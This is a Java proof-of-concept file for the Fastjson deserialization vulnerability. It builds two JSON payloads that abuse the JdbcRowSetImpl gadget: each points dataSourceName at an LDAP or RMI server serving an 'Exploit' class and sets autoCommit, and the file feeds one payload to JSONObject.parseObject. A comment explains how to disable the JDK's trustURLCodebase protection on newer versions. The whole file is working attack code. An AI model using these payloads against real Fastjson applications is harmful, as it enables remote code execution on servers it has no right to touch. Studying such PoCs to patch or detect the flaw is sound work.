package cn.rui0.fastjson.poc.victim;

import com.alibaba.fastjson.JSONObject;

public class SomeFastjsonApp {

    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }

    public static void testJdbcRowSetImpl(){
        //JDK 8u121以后版本需要设置改系统变量
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        //LADP 方式
        String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/Exploit\"," + " \"autoCommit\":true}";
        //RMI 方式
        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSONObject.parseObject(payload2);
    }

}